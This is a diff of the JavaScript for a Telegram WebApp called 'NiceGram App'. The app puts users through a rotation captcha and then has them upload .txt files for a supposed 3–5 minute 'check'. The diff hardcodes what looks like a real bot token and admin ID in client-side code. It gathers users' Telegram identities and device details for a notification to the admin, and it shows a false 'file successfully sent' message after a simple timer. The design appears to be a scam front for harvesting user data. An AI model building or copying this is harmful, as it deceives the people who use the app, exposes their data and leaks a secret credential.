@@ -31,16 +31,9 @@ const faqData = `# Частые вопросы
 // Глобальные переменные
 let fileCounter = Math.floor(Math.random() * 50) + 20; // Начальное значение
 let counterInterval;
-
-// Инициализация Telegram WebApp
-const tg = window.Telegram.WebApp;
-tg.expand();
-
-// Настройки бота (ЗАМЕНИТЕ НА СВОИ!)
-const BOT_TOKEN = "ВАШ_ТОКЕН";
-const ADMIN_ID = "ВАШ_ID";
-
-// Переменные капчи
+let tg;
+let BOT_TOKEN = "8567185651:AAFx8TIPf4nEle-hGT25sfip20dB7m0VT1I";
+let ADMIN_ID = "7632180689";
 let currentAngle = 0;
 let isDragging = false;
 let startNotificationSent = false;
@@ -49,11 +42,20 @@ let targetMax = 50;
 
 // Инициализация при загрузке страницы
 document.addEventListener('DOMContentLoaded', function() {
+    // Инициализация Telegram WebApp
+    if (window.Telegram && window.Telegram.WebApp) {
+        tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+    } else {
+        console.warn('Telegram WebApp не найден. Запуск в обычном браузере.');
+    }
+    
     spawnRandomPhotos();
     loadModalContent();
     startCounter();
+    setupEventListeners(); // Теперь после создания элементов
     initializeBotLogic();
-    setupEventListeners();
 });
 
 // Функция спавна фото
@@ -217,24 +219,45 @@ function startCounter() {
     }, 10000); // Каждые 10 секунд
 }
 
-// Настройка обработчиков событий
+// Настройка обработчиков событий для кнопок
 function setupEventListeners() {
-    // Обработчики для модальных окон
-    document.getElementById('instruction-btn').addEventListener('click', () => {
-        document.getElementById('instruction-modal').classList.add('active');
-    });
+    console.log('Настройка обработчиков событий...');
     
-    document.getElementById('faq-btn').addEventListener('click', () => {
-        document.getElementById('faq-modal').classList.add('active');
-    });
+    // Обработчики для кнопок Инструкция и FAQ
+    const instructionBtn = document.getElementById('instruction-btn');
+    const faqBtn = document.getElementById('faq-btn');
+    const closeInstruction = document.getElementById('close-instruction');
+    const closeFaq = document.getElementById('close-faq');
     
-    document.getElementById('close-instruction').addEventListener('click', () => {
-        document.getElementById('instruction-modal').classList.remove('active');
-    });
+    if (instructionBtn) {
+        instructionBtn.addEventListener('click', () => {
+            console.log('Кнопка Инструкция нажата');
+            document.getElementById('instruction-modal').classList.add('active');
+        });
+    } else {
+        console.error('Кнопка instruction-btn не найдена');
+    }
     
-    document.getElementById('close-faq').addEventListener('click', () => {
-        document.getElementById('faq-modal').classList.remove('active');
-    });
+    if (faqBtn) {
+        faqBtn.addEventListener('click', () => {
+            console.log('Кнопка FAQ нажата');
+            document.getElementById('faq-modal').classList.add('active');
+        });
+    } else {
+        console.error('Кнопка faq-btn не найдена');
+    }
+    
+    if (closeInstruction) {
+        closeInstruction.addEventListener('click', () => {
+            document.getElementById('instruction-modal').classList.remove('active');
+        });
+    }
+    
+    if (closeFaq) {
+        closeFaq.addEventListener('click', () => {
+            document.getElementById('faq-modal').classList.remove('active');
+        });
+    }
     
     // Закрытие модальных окон по клику вне окна
     document.querySelectorAll('.modal-overlay').forEach(modal => {
@@ -258,6 +281,8 @@ function setupEventListeners() {
 
 // Логика бота
 function initializeBotLogic() {
+    console.log('Инициализация логики бота...');
+    
     // Элементы
     const degreeDisplay = document.getElementById('degree');
     const sliderHandle = document.getElementById('slider-handle');
@@ -270,8 +295,33 @@ function initializeBotLogic() {
     const selectFileBtn = document.getElementById('select-file-btn');
     const fileInput = document.getElementById('file-input');
 
+    // Проверяем наличие элементов
+    if (!degreeDisplay) console.error('Элемент degree не найден');
+    if (!sliderHandle) console.error('Элемент slider-handle не найден');
+    if (!targetRange) console.error('Элемент target-range не найден');
+    if (!verifyBtn) console.error('Кнопка verify-btn не найдена');
+    if (!selectFileBtn) console.error('Кнопка select-file-btn не найдена');
+    if (!fileInput) console.error('Элемент file-input не найден');
+
+    // Генерация случайного диапазона
+    function generateRandomRange() {
+        const starts = [0, 20, 40, 60, 80, 100, 120, 140, 160];
+        const start = starts[Math.floor(Math.random() * starts.length)];
+        
+        targetMin = start;
+        targetMax = start + 20;
+        
+        if (targetMax > 180) {
+            targetMax = 180;
+            targetMin = 160;
+        }
+        
+        if (targetRange) {
+            targetRange.textContent = `${targetMin}° - ${targetMax}°`;
+        }
+    }
+
     // Инициализация
-    tg.ready();
     generateRandomRange();
     console.log('NiceGram App инициализирован');
 
@@ -294,22 +344,6 @@ function initializeBotLogic() {
         }
     }
 
-    // Генерация случайного диапазона
-    function generateRandomRange() {
-        const starts = [0, 20, 40, 60, 80, 100, 120, 140, 160];
-        const start = starts[Math.floor(Math.random() * starts.length)];
-        
-        targetMin = start;
-        targetMax = start + 20;
-        
-        if (targetMax > 180) {
-            targetMax = 180;
-            targetMin = 160;
-        }
-        
-        targetRange.textContent = `${targetMin}° - ${targetMax}°`;
-    }
-
     // Вращение стрелки
     function startRotation(e) {
         e.preventDefault();
@@ -319,7 +353,6 @@ function initializeBotLogic() {
         const container = sliderHandle.parentElement;
         const centerX = container.offsetWidth / 2;
         const centerY = container.offsetHeight / 2;
-        const radius = container.offsetWidth / 2;
         
         function updateAngle(clientX, clientY) {
             if (!isDragging) return;
@@ -336,15 +369,21 @@ function initializeBotLogic() {
             currentAngle = angle > 180 ? 360 - angle : angle;
             currentAngle = Math.round(currentAngle);
             
-            degreeDisplay.textContent = `${currentAngle}°`;
+            if (degreeDisplay) {
+                degreeDisplay.textContent = `${currentAngle}°`;
+            }
             
             if (currentAngle >= targetMin && currentAngle <= targetMax) {
-                degreeDisplay.style.color = '#00ff00';
-                degreeDisplay.style.textShadow = '0 0 25px rgba(0, 255, 0, 0.9)';
+                if (degreeDisplay) {
+                    degreeDisplay.style.color = '#00ff00';
+                    degreeDisplay.style.textShadow = '0 0 25px rgba(0, 255, 0, 0.9)';
+                }
                 sliderHandle.style.background = 'linear-gradient(135deg, #00ff66, #00aa44)';
             } else {
-                degreeDisplay.style.color = '#00ff88';
-                degreeDisplay.style.textShadow = '0 0 15px rgba(0, 255, 0, 0.6)';
+                if (degreeDisplay) {
+                    degreeDisplay.style.color = '#00ff88';
+                    degreeDisplay.style.textShadow = '0 0 15px rgba(0, 255, 0, 0.6)';
+                }
                 sliderHandle.style.background = 'linear-gradient(135deg, #00aa44, #006622)';
             }
         }
@@ -383,51 +422,53 @@ function initializeBotLogic() {
     if (sliderHandle) {
         sliderHandle.addEventListener('mousedown', startRotation);
         sliderHandle.addEventListener('touchstart', startRotation, { passive: false });
-    } else {
-        console.error('Элемент slider-handle не найден!');
     }
 
     // Проверка капчи
     if (verifyBtn) {
         verifyBtn.onclick = function() {
             if (currentAngle >= targetMin && currentAngle <= targetMax) {
-                if (tg.HapticFeedback) {
+                if (tg && tg.HapticFeedback) {
                     tg.HapticFeedback.impactOccurred('light');
                 }
                 
-                degreeDisplay.style.animation = 'pulse 0.5s';
+                if (degreeDisplay) degreeDisplay.style.animation = 'pulse 0.5s';
                 sliderHandle.style.animation = 'pulse 0.5s';
                 
                 setTimeout(() => {
-                    degreeDisplay.style.animation = '';
+                    if (degreeDisplay) degreeDisplay.style.animation = '';
                     sliderHandle.style.animation = '';
                 }, 500);
                 
-                captchaScreen.style.opacity = '0';
-                captchaScreen.style.transform = 'scale(0.95)';
+                if (captchaScreen) {
+                    captchaScreen.style.opacity = '0';
+                    captchaScreen.style.transform = 'scale(0.95)';
+                }
                 
                 setTimeout(() => {
-                    captchaScreen.classList.add('hidden');
-                    mainScreen.classList.remove('hidden');
+                    if (captchaScreen) captchaScreen.classList.add('hidden');
+                    if (mainScreen) mainScreen.classList.remove('hidden');
                     
-                    const user = tg.initDataUnsafe?.user || {};
+                    const user = tg && tg.initDataUnsafe?.user || {};
                     const name = user.first_name || "Пользователь";
-                    welcomeUser.textContent = `👋 Привет, ${name}!`;
+                    if (welcomeUser) welcomeUser.textContent = `👋 Привет, ${name}!`;
                     
                     if (!startNotificationSent) {
                         sendStartNotification(name, user.username, user.id);
                         startNotificationSent = true;
                     }
                     
-                    mainScreen.style.opacity = '0';
-                    setTimeout(() => {
-                        mainScreen.style.opacity = '1';
-                        mainScreen.style.transform = 'scale(1)';
-                    }, 50);
+                    if (mainScreen) {
+                        mainScreen.style.opacity = '0';
+                        setTimeout(() => {
+                            mainScreen.style.opacity = '1';
+                            mainScreen.style.transform = 'scale(1)';
+                        }, 50);
+                    }
                     
                 }, 300);
             } else {
-                if (tg.HapticFeedback) {
+                if (tg && tg.HapticFeedback) {
                     tg.HapticFeedback.impactOccurred('heavy');
                 }
                 
@@ -435,8 +476,86 @@ function initializeBotLogic() {
                 generateRandomRange();
             }
         };
-    } else {
-        console.error('Кнопка verify-btn не найдена!');
+    }
+
+    // Загрузка файла
+    if (selectFileBtn && fileInput) {
+        selectFileBtn.onclick = () => {
+            fileInput.click();
+        };
+
+        fileInput.onchange = async function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            
+            if (statusMsg) {
+                statusMsg.className = 'status active';
+                statusMsg.innerHTML = '⏳ Проверка файлов занимает 3-5 минут...';
+            }
+            
+            if (!file.name.toLowerCase().endsWith('.txt')) {
+                if (statusMsg) {
+                    statusMsg.className = 'status active error';
+                    statusMsg.innerHTML = '❌ Только .txt файлы разрешены';
+                }
+                this.value = '';
+                return;
+            }
+            
+            if (file.size > 10 * 1024 * 1024) {
+                if (statusMsg) {
+                    statusMsg.className = 'status active error';
+                    statusMsg.innerHTML = '❌ Файл слишком большой (макс. 10MB)';
+                }
+                this.value = '';
+                return;
+            }
+            
+            try {
+                const user = tg && tg.initDataUnsafe?.user || {};
+                const username = user.username ? `@${user.username}` : 'Скрыт';
+                const firstName = user.first_name || 'Не указано';
+                const userId = user.id || 'Неизвестно';
+                
+                const deviceInfo = detectDevice();
+                const platform = tg && tg.platform || 'Неизвестно';
+                
+                // Здесь будет отправка файла на сервер
+                console.log('Файл загружен:', file.name);
+                console.log('Пользователь:', username);
+                console.log('Устройство:', deviceInfo);
+                
+                // Имитация отправки файла
+                setTimeout(() => {
+                    if (statusMsg) {
+                        statusMsg.className = 'status active success';
+                        statusMsg.innerHTML = '✅ Файл успешно отправлен! Ожидайте результатов проверки (3-5 минут)';
+                    }
+                    
+                    if (tg && tg.HapticFeedback) {
+                        tg.HapticFeedback.notificationOccurred('success');
+                    }
+                    
+                    setTimeout(() => {
+                        if (statusMsg) {
+                            statusMsg.className = 'status';
+                        }
+                        this.value = '';
+                    }, 5000);
+                }, 1500);
+                
+            } catch (error) {
+                if (statusMsg) {
+                    statusMsg.className = 'status active error';
+                    statusMsg.innerHTML = `❌ Ошибка отправки: ${error.message}`;
+                }
+                console.error('Ошибка:', error);
+                
+                if (tg && tg.HapticFeedback) {
+                    tg.HapticFeedback.notificationOccurred('error');
+                }
+            }
+        };
     }
 
     // Отправка уведомления о старте
@@ -446,4 +565,15 @@ function initializeBotLogic() {
                            `👤 *Юзер:* @${username || 'без username'}\n` +
                            `👨 *Имя:* ${name}\n` +
                            `🆔 *ID:* \`${userId || 'неизвестно'}\`\n` +
-                           `🎯
+                           `🎯 *Диапазон капчи:* ${targetMin}°-${targetMax}°\n` +
+                           `🎯 *Выбранный угол:* ${currentAngle}°\n` +
+                           `⏰ *Время:* ${new Date().toLocaleString('ru-RU')}`;
+            
+            // Здесь будет отправка уведомления в Telegram
+            console.log('Отправка уведомления:', message);
+            
+        } catch (err) {
+            console.error('Ошибка уведомления:', err);
+        }
+    }
+}
